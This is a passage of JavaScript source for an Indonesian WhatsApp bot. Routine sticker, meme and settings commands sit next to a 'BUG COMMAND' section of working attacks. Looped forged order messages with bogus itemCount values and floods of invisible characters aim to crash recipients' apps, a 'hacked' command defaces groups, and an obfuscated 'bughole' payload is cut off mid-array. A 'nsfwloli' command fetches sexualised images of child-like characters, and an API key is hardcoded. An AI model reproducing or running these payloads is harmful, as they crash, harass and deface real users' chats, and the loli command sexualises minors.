						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await zacky.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							zacky.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
					
					case 'take':
					case 'colong':
					if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
		    		if (!isQuotedSticker) return reply('```Reply sticker nya```')
		            encmedia_ = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    media_ = await zacky.downloadAndSaveMediaMessage(encmedia_)
		            anu = args.join(' ').split('|')
		            satu = anu[0] !== '' ? anu[0] : `STICKER MAKER`
		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `BY ZACKY`
		            require('./lib/fetcher.js').createExif(satu, dua)
					require('./lib/fetcher.js').modStick(media_ , zacky, mek, from)
					break
/* ===================================================[ GAME ]==============================================================*/        
				    case 'tembak':
				    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args[0] == 'udara') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh33}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'darat') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh22}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'laut') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh11}* ]`)
                    }, 12000)
                    }
                    break
/* ===================================================[ BOT WHATSAPP ]==============================================================*/                	 
				    case 'gtts':
				    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				    if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply(`Kode bahasanya mana tod?\nContoh: id halo`)
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return reply('Textnya mana tod')
					dtt = body.slice(9)
					ranm = getRandom('.mp3')
					dtt.length > 1000 ? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						zacky.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
						fs.unlinkSync(ranm)
					})
					break
				    case 'meme':
					meme = await fetchJson('https://kagchi-api.glitch.me/meme/memes', { method: 'get' })
					buffer = await getBuffer(`https://imgur.com/${meme.hash}.jpg`)
					zacky.sendMessage(from, buffer, image, {quoted: mek, caption: '.......'})
					break
				    case 'memeindo':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://imgur.com/${memein.hash}.jpg`)
					zacky.sendMessage(from, buffer, image, {quoted: mek, caption: '.......'})
					break
					case 'setlolkey':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					lolkey = args[0]
					manikganz.lolkey = lolkey
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Prefix berhasil di ubah menjadi : ${lolkey}`)
					break
					case 'setxteamkey':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					xteamkey = args[0]
					manikganz.xteamkey = xteamkey
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Prefix berhasil di ubah menjadi : ${xteamkey}`)
					break
					case 'setvhkey':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					vhkey = args[0]
					manikganz.vhkey = vhkey
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Prefix berhasil di ubah menjadi : ${vhkey}`)
					break
				case 'setprefix':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					prefix = args[0]
					manikganz.prefix = prefix
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Prefix berhasil di ubah menjadi: *「 ${prefix} 」*`)
					break
					case 'cekimg': //CASE BY M4N1K
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					if (args.length < 1) return
					mangnik = args[0]
					tupp = await getBuffer(`${mangnik}`)
					zacky.sendMessage(from, tupp, image, {quoted: mek, caption: 'Nih Imagenya'})
					break
					case 'setbgwelkom'://CASE BY M4N1K
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					imgibb = args[0]
					manikganz.imgibb = imgibb
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Background Welcome berhasil di ubah menjadi : ${imgibb}`)
					buff = await getBuffer(`${imgibb}`)
					zacky.sendMessage(from, buff, image, {quoted: mek, caption: 'Nih Bgnya'})
					break
					case 'setfaketoko':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					faketoko = args[0]
					manikganz.faketoko = faketoko
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Fake Toko berhasil di ubah menjadi : ${faketoko}`)
					break
					case 'setfakereply':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					fakereply = args[0]
					manikganz.fakereply = fakereply
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Fake Reply berhasil di ubah menjadi : ${fakereply}`)
					break
					case 'setfakedoc':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					fakedoc = args[0]
					manikganz.fakedoc = fakedoc
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Fake Dokumen berhasil di ubah menjadi : ${fakedoc}`)
					break
					case 'setnamabot':
					if (args.length < 1) return
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					NamaBot = args[0]
					manikganz.NamaBot = NamaBot
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply(`Nama Bot berhasil di ubah menjadi : ${NamaBot}`)
					break				
					case 'settarget':
					if (args.length < 1) return reply(`${prefix}settarget 62xxxxxx`)
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					Targetchat = args[0]
					manikganz.TargetChat = TargetChat
					fs.writeFileSync('./src/settings.json', JSON.stringify(manikganz, null, '\t'))
					reply (`Succes mengganti Target Chat : ${TargetChat}`)
					case 'loli':
					loli.getSFWLoli(async (err, res) => {
						if (err) return reply('❌ *ERROR* ❌')
						buffer = await getBuffer(res.url)
						zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Ingat! Citai Lolimu'})
					})
					break
				    case 'nsfwloli':
					if (!isNsfw) return reply('❌ *FALSE* ❌')
					loli.getNSFWLoli(async (err, res) => {
						if (err) return reply('❌ *ERROR* ❌')
						buffer = await getBuffer(res.url)
						zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Jangan jadiin bahan buat comli om'})
					})
					break
				    case 'hilih':
					if (args.length < 1) return reply('Teksnya mana um?')
					anu = await fetchJson(`https://mhankbarManikBars.herokuapp.com/api/hilih?teks=${body.slice(7)}`, {method: 'get'})
					reply(anu.result)
					break
				case 'yt2mp3':
					if (args.length < 1) return reply('Urlnya mana um?')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					anu = await fetchJson(`https://mhankbarbar.moe/api/yta?url=${args[0]}&apiKey=IDxO1TFYnKADlX4pxcHa`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Title* : ${anu.title}\n*Filesize* : ${anu.filesize}`
					thumb = await getBuffer(anu.thumb)
					zacky.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					zacky.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
					break
				    case 'getaudio': //Get audio simple
					aud = args[0] - 1
					nope = await fetchJson(`https://videfikri.com/api/ytmp3/?url=https://youtu.be/${anu.result.data[aud].id}`)
					nu = nope.result
					thumb = await getBuffer(nu.thumbnail)
					katanya = `*Lagu di temukan*\nJudul : ${nu.judul}\nSize : ${nu.size}\nSource : https://youtu.be/${nu.id}\n*Tunggu sedang mengirim lagu mungkin cukup lama*`
					if (Number(nu.size.split(' MB')[0]) >= 5.0) return zacky.sendMessage(from, thumb, image, { quoted: mek, caption: `*Lagu di temukan*\nJudul : ${nu.judul}\nSize : ${nu.size}\nSource : https://youtu.be/${nu.id}\n\nSize lagu terlalu besar silakan download sendiri\nLink : ${nu.url}`})
					zacky.sendMessage(from, thumb, image, { quoted: mek, caption: katanya })
					buffer = await getBuffer(nu.url)
					zacky.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true })
					await limitAdd(sender)
					break
				    case 'tiktokstalk':
				    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		            if (isBanned) return reply('Lu sudah terbenned!')
					try {
						if (args.length < 1) return zacky.sendMessage(from, 'Usernamenya mana um?', text, {quoted: mek})
						let { user, stats } = await tiktod.getUserProfileInfo(args[0])
						reply(mess.wait)
						teks = `*ID* : ${user.id}\n*Username* : ${user.uniqueId}\n*Nickname* : ${user.nickname}\n*Followers* : ${stats.followerCount}\n*Followings* : ${stats.followingCount}\n*Posts* : ${stats.videoCount}\n*Luv* : ${stats.heart}\n`
						buffer = await getBuffer(user.avatarLarger)
						zacky.sendMessage(from, buffer, image, {quoted: mek, caption: teks})
					} catch (err) {
						console.log(`Error :`, color(e,'red'))
						reply('Kemungkinan username tidak valid')
					}
					break              

/* ===================================================[ BUG COMMAND ]==============================================================*/                                           
                case 'hacked':
                if (!isGroup) return reply(ind.groupo())              
                if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())                        
                tessgc = await getBuffer(`https://i.ibb.co/j32Fkrg/IMG-20210726-WA0108.jpg`)
                zacky.updateProfilePicture (from, tessgc)
                zacky.groupUpdateSubject(from, `HACKED BY ${pushname}`)
                zacky.groupUpdateDescription(from, `https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR\n\nhttps://chat.whatsapp.com/CJN785qutPDFOokOLPpovd\n\nhttps://chat.whatsapp.com/H7L6i5mKrG4Ez8hQ4SFJyi\n\n*NOMOR ADMIN👇*\nwa.me/6283896715117?text=Maksud+lu+apa+hina+BTS+Cill\n\n*AYO ARMY KITA SERANG HATERS*\n*SUPAYA MEREKA KAPOK😡*`)             
                zacky.sendMessage(from, 'Succes Hacked', text, {quoted: freply})                
				break               
                
                case 'bug':
				if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb()) 
				if (args.length < 1) return reply('Jumlahnya?')
				for (let i = 0; i < args[0]; i++) {
                await zacky.toggleDisappearingMessages(from, 0)
                }
                break
                
                case 'buggc':    
                if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())          
                await zacky.toggleDisappearingMessages(from)   
                zacky.sendMessage(from, 'Yahaha', text, {quoted: freply}) 			    	    	     			     
	            break                
			                    
                case 'bugcombine': 
                if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
                zacky.toggleDisappearingMessages(from, 'HACKED')
zacky.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 999999999, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break

                case 'buglokasi':                 
                if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
zacky.sendMessage(from, {degreesLatitude: 34.0184,
degreesLongitude: -118.411,
name: `${NamaOwner}`,
address: `${NamaBot}`,
jpegThumbnail: fs.readFileSync('./lib/♡.jpeg') },location,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${NamaOwner}`,
    orderTitle: `${NamaBot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break

                case 'bugpc':					                
                if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
                if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
zacky.sendMessage(from, `Yahaha`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${NamaBot}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break 
                
                case 'bugtroli':
			    if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())			    
                function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
zacky.sendMessage(nomor,`▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`,MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail:fs.readFileSync('./lib/♡.jpeg'),
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️HengkerTyz☠️',
    orderTitle: 'ZackyVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bugg(jid){
for(let i=0;i < 1;i++){
var WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
zacky.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bugg(targett)
await sleep(1)
troli(targett)
await sleep(1)
bugg(targett)
}
attack(mek.key.remoteJid)
break

case 'troli':
if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb()) 
if (args.length < 1) return reply('Jumlahnya?')
function bug(jid){
for (let i = 0; i < args[0]; i++) {
var WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
zacky.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attackk(targettt){
bug(targettt, 0)
}
attackk(mek.key.remoteJid)
break

case 'troli2':
if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb()) 
if (args.length < 1) return reply('Jumlahnya?')		        
					var group = await zacky.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: `Yahaha`,
					contextInfo: { mentionedJid: mem },
					quoted: freply
					}
		        for (let i = 0; i < args[0]; i++) {
		        zacky.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }		        
		       break

                case 'bugitem':
                if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
                if (args.length < 1) return reply('Jumlahnya?')
                for (let i = 0; i < args[0]; i++) {
           res = zacky.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": -969769349, "message": `͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`, "footerText": `${wib} WIB  ${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`, "thumbnail": virgam, "surface": 'CATALOG' }}, {quoted:fgclink})
           zacky.relayWAMessage(res)
           }
           break                                            
           
                case 'bughole':
if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
var _0x4e42=['݆݆ܻܻࣩ','*Myth','͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋','ܻܻܻܺܺ','݆ܻܻࣩࣩ','๊๊์์์','֟֟֟֓֓','icXbo','hatsa','ٍٍٍٞ٘','᪴᪴᪴᪴Myt','֒֒֒֒֓','์์์๋๋','ؕؕؕؕؖ','Title','͊̈́̈́͋͋͋͋͋͋͋͠͠͠͠͠','ືືຶຶຶ','MOKAD','ّّّّؖ','͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠','̫̫̫̫̫̫̫̫̽̽̽̽̽̽̽','เึางื','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢','͢͢͠͠͠͠҉҉҉','৭99**','toggl','֓֓֒֒֒','ܑܑۛۛۛ','͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋','҈֟֟֟֟','itemC','ࣩࣩࣩࣧࣧ','ৣ͜͡҉*My','֒֒֒֘֘','֒֓֓֓֓','৭৭৭99','ดุท้่','̼̼̼̼̼̽̽̽̽̽̽̽͊͊͊','Hello','৭ঔৣ͜͡҉*','ຶຶຶຶຶ᪴᪴','ًًٍٍٍ','๊๊๊ࣤࣤ','҈҈̫̫̫̫̫̫̫̫̫̫̫','ؖؕؕؕؕ','๊๊๊์์','͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠','݆݊݊݊݊','̫̫̫̫̫̫̫̫̫̫̫̽̽̽̽','ܺܺܺܺܺ','֓֓֓֓֒','Messa','͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋','t҈҈҈҉','҈҈֟֟֟','͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠','͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́','͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠','݉݊݊݊݊','ࣩ࣯ࣩࣩࣩ','Xbot*','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','҈҈҈̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠','ssage','֓֓֓֒֒','݊݊݊݊݊','ຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','Xbot҈','ingMe','\x20Worl','ؕؕؖؖؖ','ࣨࣨࣨࣨࣤ','݆݆݊݊݊','9999*','֓֒֒֒֘','ؖؖؖؕؕ','ܺ݉݉݉݉','݉݉݉݊݊','৭৭99*','᪴᪴᪴᪴᪴᪴᪴My','֒֒֘֘֘','֗ؖؖؖؖ','๊ࣤࣤࣤࣤ','֟֓֓֓֓','bot*৭','֟֟֟֟֓','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ܑܑܑܑܑ','ٍٍٍٍٍ','Mythi','࣯ࣩࣩࣩࣩ','thicX','order','๋๋๋ືື','҈҈҈҉҉','ًًّٞٞ','݆݆݆݆݅','4829fwHcxj','13hXShDP','͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋','ot*৭৭','݉݉݉݉݊','҈҈҈҈̫̫̫̫̫','͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊','ًًًًً','1359289sKNbgc','݆݆݆݆ܻ','ًّٞٞٞ','t*৭ঔৣ͜͡','৭৭৭*M','์๋๋๋๋','̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋','bot҈҈','ot҈҈҈','**ঔৣ͜͡҉','๊๊๊๊๊','ّّؖؖؖ','ܑܑܑܑۛ','̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊','ܻܻܻܻܻ','hicXb','*ผิดุ','ࣩࣩࣩ࣯ࣩ','҉҉҉҉҉','҈҉҉҉҈','ࣩࣩࣩࣨࣨ','ppear','ًًًٍٍ','̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́','pp.ne','ࣨࣨࣤࣤࣤ','ࣩࣩࣩࣧࣧ','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','֘֘֘֗֗','essag','͢͢͠͠͠͠͠͠͠҉҉','ًٍٍٍۛ','างืผิ','ؖؖؖؖؖ','ܑܑܑܑܻ','҉҉҉҈҈','݆݆݆݆݅','ّّّؖؖ','݉݉݊݊݊','๊๊ࣤࣤࣤ','๊๊๊๊์','*৭৭৭ঔ','ًًًًّ','ٍٍٍٍ٘','҈҈҈҈҉','๋๋๋๋๋','ٍۛۛۛۛ','๒๒๒๒๒','֒֒֒֓֓','cXbot','ࣩࣨࣨࣨࣨ','ࣨࣨࣨࣤࣤ','๊์์์์','ܺܺܺ݉݉','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ًًٍٍٍ','֟֟֟֟֟','݆݆݆݊݊','͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠','ࣩࣩࣩࣩࣧ','*999*','ືືືຶຶ','৭৭৭ঔৣ͜͡','᪴Myth','ࣤࣤࣤࣤࣤ','ܑܑܑܻܻ','͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠','͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋','͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊','֘֗֗֗֗','ܻܻࣩࣩࣩ','ܻࣩࣩࣩࣩ','ࣩࣩࣩࣩࣨ','surfa','ًًًٍٍ','messa','ّٞٞٞٞ','҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫','ܑۛۛۛۛ','ܑܑܻܻܻ','๋๋๋๋ື','HOLE','ࣧࣧࣧࣧࣧ','owner','ًًًّٞ','ؕؕؕؖؖ','ٞٞٞٞ٘','҉҈҈҈҉','**999','͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋','0@s.w','݆݆݅݅݅','1cLV